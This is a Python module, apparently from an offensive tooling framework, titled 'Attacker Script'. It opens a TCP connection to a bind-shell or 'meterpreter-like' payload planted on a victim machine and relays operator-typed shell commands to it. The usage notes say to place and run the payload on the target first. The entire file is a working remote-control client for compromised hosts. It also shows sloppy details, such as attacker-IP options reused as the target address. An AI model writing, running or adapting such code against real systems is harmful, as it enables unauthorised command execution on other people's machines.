import pyfiglet
from collections import OrderedDict
import socket
import subprocess
import json
import os

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': '**Attacker Script (Python)** ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': '**Attacker Script**: Connects to the payload(bind tcp and meterpreter) and sends commands.  ',
            'Note':('### **Usage**  \n1. Save the payload scripts on the target machine.  \n2. Run the payload scripts on the target machine.  \n3. Use the attacker script to connect and send commands.  '),
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('LHOST', ('', True,'Enter Attacker IP')),
            ('LPORT', ('', True,'Enter Attacker port'))
           
               
                ])
                }
    def logo(self):
    	title = 'Meterpreter '
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set LHOST <ip_address> | set LPORT <port>, then run")
   
   
    def execute(self):
        self.logo()
        TARGET_IP = self.info['Options']['LHOST'][0]
        TARGET_PORT = self.info['Options']['LPORT'][0]
        # Connect to the target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")
        # Send commands
        while True:
        	try:
        		# Get command from user
        		command = input("shell> ")
        		if command == "exit":
        			return #break
        		# Send command to target
        		if TARGET_PORT == 4444:
        			sock.send(command.encode())
        			output = sock.recv(4096).decode()
        			print(output)
        		else:  # Meterpreter-like
        		    cmd_data = {"action": "shell", "args": command.split()}
        		    sock.send(json.dumps(cmd_data).encode())
        		    output = sock.recv(4096).decode()
        		    print(output)
        	except Exception as e:
        		print(f"[-] Error: {e}")
        		return #break
        # Close the connection
        sock.close()
        
        
        return f"[+] Waiting for Attacker ..."
    